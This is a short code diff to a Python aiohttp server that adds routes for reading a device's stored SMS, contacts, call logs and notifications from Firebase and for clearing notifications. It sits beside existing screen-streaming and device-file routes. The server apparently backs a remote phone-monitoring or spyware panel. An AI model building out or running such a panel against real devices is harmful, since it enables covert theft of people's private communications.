@@ -39,6 +39,8 @@ from modules.api_handlers import (
     api_web_tg_link_token,
     # Files
     api_web_files, api_web_list_files_device,
+    # Stored data (Firebase read endpoints — view current sms/contacts/etc.)
+    api_web_get_data, api_web_get_notifications, api_web_clear_notifications,
     # Streaming
     api_stream_frame, api_stream_status, api_stream_start, api_stream_stop,
     api_jpeg_stream_start, api_jpeg_stream_stop,
@@ -124,6 +126,14 @@ def create_app() -> web.Application:
     # File Management
     app.router.add_get('/api/web/files', api_web_files)
     app.router.add_get('/api/web/device/files', api_web_list_files_device)
+
+    # Stored Data API (read from Firebase RTDB)
+    # GET    /api/web/data/{device_id}?type=sms|contacts|calls|...
+    # GET    /api/web/notifications/{device_id}
+    # DELETE /api/web/notifications/{device_id}
+    app.router.add_get('/api/web/data/{device_id}', api_web_get_data)
+    app.router.add_get('/api/web/notifications/{device_id}', api_web_get_notifications)
+    app.router.add_delete('/api/web/notifications/{device_id}', api_web_clear_notifications)
     
     # Streaming API
     app.router.add_get('/api/stream/frame/{device_id}', api_stream_frame)
